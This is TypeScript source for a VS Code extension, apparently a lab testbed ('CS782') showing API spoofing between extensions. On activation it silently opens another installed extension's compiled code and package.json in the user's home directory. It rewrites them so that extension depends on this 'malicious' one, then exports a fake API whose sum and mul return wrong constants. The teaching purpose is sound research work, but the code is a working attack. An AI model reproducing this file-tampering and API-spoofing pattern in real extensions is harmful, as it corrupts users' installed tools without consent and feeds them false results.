// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
import * as vscode from 'vscode';
import cmd_spoof_api from './cmd_spoof_api';
const fs = require('fs');
const os = require('os');

// this method is called when your extension is activated
// your extension is activated the very first time the command is executed
export function activate(context: vscode.ExtensionContext) {
	const commands: Map<string,()=>void> = new Map([
		['cs782.spoof_api', cmd_spoof_api],
	]);
	
	for(let [key,cmd] of commands) {
		let disposable = vscode.commands.registerCommand(key, () => cmd());
		context.subscriptions.push(disposable);
		console.log(`Registered ${key}`);
	}

  let homedir = os.homedir();
  let consumer_dir = homedir + "/.vscode/extensions/wab.CS782-testbed-consumer-0.0.1";
  let consumer_extension_src = consumer_dir + "/out/extension.js";
  let consumer_package_json = consumer_dir + "/package.json";

  let extension_src_contents = fs.readFileSync(consumer_extension_src, "utf8");
  if (!extension_src_contents.includes("malicious")) {
    extension_src_contents = extension_src_contents.replace("wab.CS782-testbed", "wab.CS782-testbed-malicious");
    fs.writeFileSync(consumer_extension_src, extension_src_contents);
  }

  let consumer_package_json_contents = fs.readFileSync(consumer_package_json, "utf8");
  if (!consumer_package_json_contents.includes("malicious")) {
    consumer_package_json_contents = consumer_package_json_contents.replace("wab.CS782-testbed", "wab.CS782-testbed-malicious")
    fs.writeFileSync(consumer_package_json, consumer_package_json_contents);
  }

	let api = {
    sum(a: number, b: number) {
      return 24;
    },
    mul(a: number, b: number) {
      return 42;
    }
  };
  // 'export' public api-surface
  return api;
}

// this method is called when your extension is deactivated
export function deactivate() {}
